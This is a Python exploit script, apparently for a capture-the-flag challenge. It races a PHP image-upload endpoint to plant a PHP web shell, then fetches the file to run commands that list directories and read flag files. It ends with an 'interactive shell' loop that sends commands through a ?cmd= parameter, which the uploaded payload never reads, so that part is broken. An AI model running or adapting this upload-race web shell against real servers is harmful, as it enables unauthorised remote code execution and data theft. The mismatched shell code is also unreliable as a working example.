#!/usr/bin/env python3
import requests
import threading
import time
import sys
from concurrent.futures import ThreadPoolExecutor

class RaceConditionExploit:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.upload_url = f"{self.target_url}/upload.php"
        self.session = requests.Session()
        
    def create_payload(self):
        return """<?php
echo "<pre>";
system("ls -la");
system("cat /flag* 2>/dev/null");
system("cat flag* 2>/dev/null");
echo "</pre>";
?>"""
        
    def upload_file(self, filename, content):
        files = {'imageFile': (filename, content, 'image/jpeg')}
        data = {'submit': 'Upload'}
        try:
            response = self.session.post(self.upload_url, files=files, data=data, 
                                       allow_redirects=False, timeout=10)
            return response.status_code
        except:
            return None
    
    def access_file(self, filename):
        file_url = f"{self.target_url}/uploads/{filename}"
        try:
            response = self.session.get(file_url, timeout=5)
            if response.status_code == 200 and "<pre>" in response.text:
                return True, response.text
            return False, response.text
        except Exception as e:
            return False, str(e)
    
    def execute_command(self, filename, command):
        file_url = f"{self.target_url}/uploads/{filename}?cmd={command}"
        try:
            response = self.session.get(file_url, timeout=10)
            return response.status_code == 200, response.text
        except Exception as e:
            return False, str(e)
    
    def race_attack(self, filename, num_threads=20):
        payload = self.create_payload()
        print(f"[*] Racing {self.target_url} with {num_threads} threads")
        
        success = False
        
        def access_worker():
            nonlocal success
            for i in range(100):
                if success:
                    break
                result, content = self.access_file(filename)
                if result:
                    print(f"\n[+] SUCCESS! Content:\n{content}")
                    success = True
                    break
                time.sleep(0.001)
        
        def upload_worker():
            while not success:
                self.upload_file(filename, payload)
                time.sleep(0.01)
        
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            upload_thread = threading.Thread(target=upload_worker)
            upload_thread.daemon = True
            upload_thread.start()
            
            futures = [executor.submit(access_worker) for _ in range(num_threads)]
            
            start_time = time.time()
            while not success and (time.time() - start_time) < 30:
                time.sleep(0.1)
            
            return (success, filename) if success else (False, None)
    
    def interactive_shell(self, filename):
        print(f"\n[+] Shell: {self.target_url}/uploads/{filename}")
        
        while True:
            try:
                cmd = input("shell> ").strip()
                if cmd.lower() in ['exit', 'quit']:
                    break
                if not cmd:
                    continue
                    
                success, output = self.execute_command(filename, cmd)
                print(output if success else f"Error: {output}")
                    
            except KeyboardInterrupt:
                print("\n[!] Exiting...")
                break

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 exploit.py <target_url>")
        sys.exit(1)
    
    exploit = RaceConditionExploit(sys.argv[1])
    filename = f"shell_{int(time.time())}.php"
    
    success, shell_file = exploit.race_attack(filename)
    
    if success:
        exploit.interactive_shell(shell_file)
    else:
        print("[-] Exploit failed")

if __name__ == "__main__":
    main()